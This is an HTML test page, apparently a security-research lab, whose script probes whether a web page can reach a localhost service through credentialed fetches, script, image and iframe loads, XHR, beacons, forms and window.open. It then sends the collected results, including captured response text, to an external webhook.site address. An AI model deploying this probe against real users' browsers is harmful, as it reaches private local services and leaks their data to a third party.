<!doctype html>
<html><head><meta charset=utf-8><title>LNA lab</title></head>
<body>
<pre id=out>running</pre>
<script>
const T = 'http://127.0.0.1:4103';
const SCOPE = '11111111-1111-1111-1111-111111111111';
const R = window.R = { origin: location.origin, t0: Date.now() };
const sleep = (ms) => new Promise(r => setTimeout(r, ms));
function withTimeout(p, ms) { return Promise.race([p, new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), ms))]); }
async function probe(name, fn) {
  const t = Date.now();
  try { const v = await withTimeout(Promise.resolve().then(fn), 4000); R[name] = { ok: true, v, ms: Date.now() - t }; }
  catch (e) { R[name] = { ok: false, e: String(e), ms: Date.now() - t }; }
  document.getElementById('out').textContent = JSON.stringify(R, null, 1);
}
(async () => {
  await probe('perm', async () => {
    if (!navigator.permissions) return 'no-permissions';
    try { const p = await navigator.permissions.query({ name: 'local-network-access' }); return p.state; }
    catch (e) { return 'perm-err:' + e; }
  });
  await probe('fetch_nc', async () => {
    const r = await fetch(T + '/api/comments?page=matthew.7&scope=' + SCOPE, { mode: 'no-cors', credentials: 'include' });
    return { type: r.type, status: r.status, ok: r.ok };
  });
  await probe('fetch_cors', async () => {
    const r = await fetch(T + '/api/comments?page=matthew.7&scope=' + SCOPE, { credentials: 'include' });
    return { type: r.type, status: r.status, text: (await r.text()).slice(0, 40) };
  });
  await probe('script', () => new Promise((res, rej) => {
    const s = document.createElement('script'); s.src = T + '/lna.js?x=' + Math.random();
    s.onload = () => res({ load: 1, exec: window.LNA_SCRIPT || 0 }); s.onerror = () => rej(new Error('script onerror'));
    document.head.appendChild(s);
  }));
  await probe('img', () => new Promise((res, rej) => {
    const i = new Image(); i.onload = () => res('load'); i.onerror = () => rej(new Error('img onerror'));
    i.src = T + '/lna.png?x=' + Math.random();
  }));
  await probe('iframe_nav', () => new Promise((res, rej) => {
    const f = document.createElement('iframe'); f.style.cssText = 'width:10px;height:10px';
    f.onload = () => res({ load: 1, url: (() => { try { return f.contentWindow.location.href; } catch (e) { return 'sop'; } })() });
    f.onerror = () => rej(new Error('iframe onerror'));
    f.src = T + '/api/stats?scope=' + SCOPE + '&x=' + Math.random();
    document.body.appendChild(f);
  }));
  await probe('xhr', () => new Promise((res, rej) => {
    const x = new XMLHttpRequest(); x.open('GET', T + '/lna.js?x=' + Math.random());
    x.onload = () => res({ status: x.status }); x.onerror = () => rej(new Error('xhr onerror')); x.send();
  }));
  await probe('beacon', async () => {
    const ok = navigator.sendBeacon(T + '/api/stats?scope=' + SCOPE + '&beacon=' + Math.random(), 'x');
    return ok;
  });
  await probe('form_nav', () => new Promise((res, rej) => {
    const f = document.createElement('iframe'); f.name = 'ft' + Math.random().toString(36).slice(2); f.style.cssText = 'width:10px;height:10px';
    f.onload = () => res('load'); f.onerror = () => rej(new Error('form frame onerror'));
    document.body.appendChild(f);
    const form = document.createElement('form'); form.method = 'GET'; form.action = T + '/api/stats'; form.target = f.name;
    const i = document.createElement('input'); i.name = 'scope'; i.value = SCOPE; form.appendChild(i);
    document.body.appendChild(form); form.submit();
  }));
  await probe('open', async () => {
    const w = window.open(T + '/lna.png?open=1', '_blank');
    return w ? 'opened' : 'blocked';
  });
  R.done = Date.now();
  document.title = 'LNA_DONE';
  document.getElementById('out').textContent = JSON.stringify(R, null, 1);
  try {
    await fetch('https://webhook.site/df1d70e4-23a5-4089-9cbf-41bf926a7bab/?lna=' + encodeURIComponent(JSON.stringify(R)), { mode: 'no-cors' });
  } catch (e) { R.webhookErr = String(e); }
})();
</script>
</body></html>
